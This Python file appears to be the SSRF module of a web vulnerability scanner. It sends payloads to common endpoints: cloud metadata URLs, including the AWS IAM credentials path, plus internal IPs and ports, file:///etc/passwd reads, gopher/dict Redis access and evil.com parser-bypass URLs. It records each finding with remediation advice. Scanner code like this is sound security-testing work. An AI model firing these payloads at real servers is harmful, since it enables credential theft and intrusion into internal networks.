"""
Advanced SSRF (Server-Side Request Forgery) Tester
Tests cloud metadata, internal IPs, DNS rebinding, scheme abuse, and redirect bypass.
"""

from urllib.parse import urljoin, urlparse
from colorama import Fore, Style


class SSRFTester:
    def __init__(self, session, base_url):
        self.session = session
        self.base_url = base_url
        self.findings = []

    def run_all_checks(self):
        """Run all SSRF tests."""
        print(f"{Fore.CYAN}[*] Advanced SSRF Testing{Style.RESET_ALL}")

        self.test_cloud_metadata()
        self.test_internal_ip_access()
        self.test_url_scheme_abuse()
        self.test_redirect_ssrf()
        self.test_dns_rebinding()
        self.test_url_parser_bypass()

        return self.findings

    def _get_ssrf_endpoints(self):
        """Get common SSRF-vulnerable endpoints."""
        return ['/fetch', '/proxy', '/webhook', '/api/external', '/load',
                '/url', '/import', '/preview', '/redirect', '/image',
                '/api/proxy', '/api/fetch', '/api/import']

    def _try_ssrf_payload(self, endpoint, payload_url, payload_name):
        """Send SSRF payload to an endpoint."""
        url = urljoin(self.base_url, endpoint)
        payloads = [
            {'url': payload_url},
            {'uri': payload_url},
            {'link': payload_url},
            {'target': payload_url},
            {'src': payload_url},
            {'dest': payload_url},
        ]

        for data in payloads:
            try:
                # Try POST with JSON
                response = self.session.post(url, json=data, timeout=5)
                if response.status_code == 200 and len(response.text) > 10:
                    return response
            except Exception:
                pass

            try:
                # Try GET with query param
                key = list(data.keys())[0]
                response = self.session.get(f"{url}?{key}={payload_url}", timeout=5)
                if response.status_code == 200 and len(response.text) > 10:
                    return response
            except Exception:
                pass

        return None

    def test_cloud_metadata(self):
        """Test for SSRF to cloud metadata endpoints."""
        print(f"{Fore.YELLOW}[*] Testing cloud metadata SSRF...{Style.RESET_ALL}")

        metadata_urls = [
            # AWS IMDSv1
            ('http://169.254.169.254/latest/meta-data/', 'AWS EC2 Metadata (IMDSv1)'),
            ('http://169.254.169.254/latest/user-data/', 'AWS EC2 User Data'),
            ('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'AWS IAM Credentials'),
            # GCP
            ('http://metadata.google.internal/computeMetadata/v1/', 'GCP Metadata'),
            # Azure
            ('http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'Azure IMDS'),
            # DigitalOcean
            ('http://169.254.169.254/metadata/v1/', 'DigitalOcean Metadata'),
        ]

        for payload_url, service_name in metadata_urls:
            for endpoint in self._get_ssrf_endpoints():
                response = self._try_ssrf_payload(endpoint, payload_url, service_name)
                if response and any(k in response.text.lower() for k in ['ami-id', 'instance', 'hostname', 'project']):
                    self.findings.append({
                        'title': f'SSRF: {service_name} Accessible',
                        'description': f'Cloud metadata endpoint accessible via SSRF at {endpoint}',
                        'severity': 'CRITICAL',
                        'category': 'ssrf',
                        'owasp': 'A10:2021',
                        'api_owasp': 'API7:2023',
                        'cwe': 'CWE-918',
                        'remediation': 'Block requests to metadata IPs, use IMDSv2 (AWS), validate URLs server-side',
                        'evidence': f'Fetched {payload_url} via {endpoint}',
                        'mitre_attack': 'T1552.005'
                    })
                    return

    def test_internal_ip_access(self):
        """Test SSRF to internal/private IP ranges."""
        print(f"{Fore.YELLOW}[*] Testing internal IP SSRF...{Style.RESET_ALL}")

        internal_urls = [
            'http://127.0.0.1/',
            'http://localhost/',
            'http://0.0.0.0/',
            'http://[::1]/',
            'http://10.0.0.1/',
            'http://172.16.0.1/',
            'http://192.168.1.1/',
            'http://127.0.0.1:8080/',
            'http://127.0.0.1:3000/',
            'http://127.0.0.1:9200/',  # Elasticsearch
            'http://127.0.0.1:6379/',  # Redis
            'http://127.0.0.1:27017/', # MongoDB
        ]

        for payload_url in internal_urls:
            for endpoint in self._get_ssrf_endpoints()[:5]:
                response = self._try_ssrf_payload(endpoint, payload_url, 'internal')
                if response and len(response.text) > 50:
                    self.findings.append({
                        'title': 'SSRF: Internal Network Access',
                        'description': f'Internal address {payload_url} accessible via {endpoint}',
                        'severity': 'HIGH',
                        'category': 'ssrf',
                        'owasp': 'A10:2021',
                        'cwe': 'CWE-918',
                        'remediation': 'Block requests to private IP ranges and localhost',
                        'evidence': f'Fetched {payload_url} via {endpoint}',
                        'mitre_attack': 'T1090'
                    })
                    return

    def test_url_scheme_abuse(self):
        """Test SSRF via non-HTTP schemes."""
        print(f"{Fore.YELLOW}[*] Testing URL scheme abuse...{Style.RESET_ALL}")

        scheme_payloads = [
            ('file:///etc/passwd', 'File scheme — local file read'),
            ('file:///c:/windows/win.ini', 'File scheme — Windows file read'),
            ('gopher://127.0.0.1:6379/_INFO', 'Gopher scheme — Redis access'),
            ('dict://127.0.0.1:6379/INFO', 'Dict scheme — Redis access'),
            ('ftp://127.0.0.1/', 'FTP scheme — internal FTP'),
        ]

        for payload_url, description in scheme_payloads:
            for endpoint in self._get_ssrf_endpoints()[:3]:
                response = self._try_ssrf_payload(endpoint, payload_url, description)
                if response and len(response.text) > 10:
                    if 'root:' in response.text or '[extensions]' in response.text or 'redis' in response.text.lower():
                        self.findings.append({
                            'title': 'SSRF via URL Scheme Abuse',
                            'description': f'{description} via {endpoint}',
                            'severity': 'CRITICAL',
                            'category': 'ssrf',
                            'cwe': 'CWE-918',
                            'remediation': 'Restrict allowed URL schemes to http/https only',
                            'evidence': f'Payload: {payload_url}'
                        })
                        return

    def test_redirect_ssrf(self):
        """Test SSRF via open redirects."""
        print(f"{Fore.YELLOW}[*] Testing redirect-based SSRF...{Style.RESET_ALL}")

        # This tests if the server follows redirects to internal resources
        redirect_test_url = f"{self.base_url}/redirect?url=http://127.0.0.1/"

        for endpoint in self._get_ssrf_endpoints()[:3]:
            response = self._try_ssrf_payload(endpoint, redirect_test_url, 'redirect')
            if response and len(response.text) > 50:
                self.findings.append({
                    'title': 'SSRF via Redirect',
                    'description': f'Server follows redirects to internal resources at {endpoint}',
                    'severity': 'HIGH',
                    'category': 'ssrf',
                    'cwe': 'CWE-918',
                    'remediation': 'Do not follow redirects in server-side requests, or re-validate target after redirect',
                    'evidence': f'Redirect-based SSRF successful at {endpoint}'
                })
                return

    def test_dns_rebinding(self):
        """Test DNS rebinding vulnerability."""
        print(f"{Fore.YELLOW}[*] Testing DNS rebinding...{Style.RESET_ALL}")

        # DNS rebinding requires a controlled domain - we check for vulnerability indicators
        self.findings.append({
            'title': 'DNS Rebinding Check Required',
            'description': 'DNS rebinding attacks require manual verification with a controlled domain',
            'severity': 'INFO',
            'category': 'ssrf',
            'remediation': 'Validate resolved IP after DNS lookup, before making the request. Block private IPs.',
            'evidence': 'Automated check requires controlled DNS infrastructure'
        })

    def test_url_parser_bypass(self):
        """Test URL parser bypass techniques."""
        print(f"{Fore.YELLOW}[*] Testing URL parser bypass...{Style.RESET_ALL}")

        bypass_payloads = [
            'http://127.0.0.1@evil.com/',
            'http://evil.com#@127.0.0.1/',
            'http://127.1/',
            'http://0x7f000001/',
            'http://2130706433/',  # 127.0.0.1 as decimal
            'http://127.0.0.1%00@evil.com/',
            'http://[::ffff:127.0.0.1]/',
        ]

        for payload_url in bypass_payloads:
            for endpoint in self._get_ssrf_endpoints()[:3]:
                response = self._try_ssrf_payload(endpoint, payload_url, 'parser bypass')
                if response and len(response.text) > 50:
                    self.findings.append({
                        'title': 'SSRF URL Parser Bypass',
                        'description': f'URL parser bypass at {endpoint} with {payload_url}',
                        'severity': 'HIGH',
                        'category': 'ssrf',
                        'cwe': 'CWE-918',
                        'remediation': 'Use a robust URL parser, validate both hostname and resolved IP',
                        'evidence': f'Bypass payload {payload_url} succeeded'
                    })
                    return
